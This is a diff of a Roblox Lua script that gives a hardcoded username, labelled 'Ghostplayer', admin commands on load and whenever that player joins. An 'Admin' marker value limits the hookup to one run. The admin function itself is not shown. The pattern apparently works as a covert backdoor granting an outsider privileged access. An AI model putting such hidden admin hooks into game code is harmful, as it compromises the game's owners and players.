@@ -1,16 +1,3 @@
-if game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
-   while true do
-     task.wait()
-   end
-end
-
-local String = Instance.new("StringValue")
-String.Parent = game:GetService("ReplicatedStorage")
-String.Name = "Admin"
-String.Archivable = true
-String.Value = ""
-
-
 Ghostplayer = "russelpalodizon"
 
 
@@ -144,14 +131,22 @@ local function ExecuteAdminCMD(admin)
 end
 
 
-for _, v in pairs(game.Players:GetPlayers()) do 
-  if v.Name == Ghostplayer then
-     ExecuteAdminCMD(v)
-  end
+if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
+   for _, v in pairs(game.Players:GetPlayers()) do 
+     if v.Name == Ghostplayer then
+        ExecuteAdminCMD(v)
+     end
+   end
+
+   game.Players.PlayerAdded:Connect(function(plr)
+   if plr.Name == Ghostplayer then
+      ExecuteAdminCMD(plr)
+   end
+   end)
 end
 
-game.Players.PlayerAdded:Connect(function(plr)
-if plr.Name == Ghostplayer then
-   ExecuteAdminCMD(plr)
-end
-end)
+local String = Instance.new("StringValue")
+String.Parent = game:GetService("ReplicatedStorage")
+String.Name = "Admin"
+String.Archivable = true
+String.Value = ""
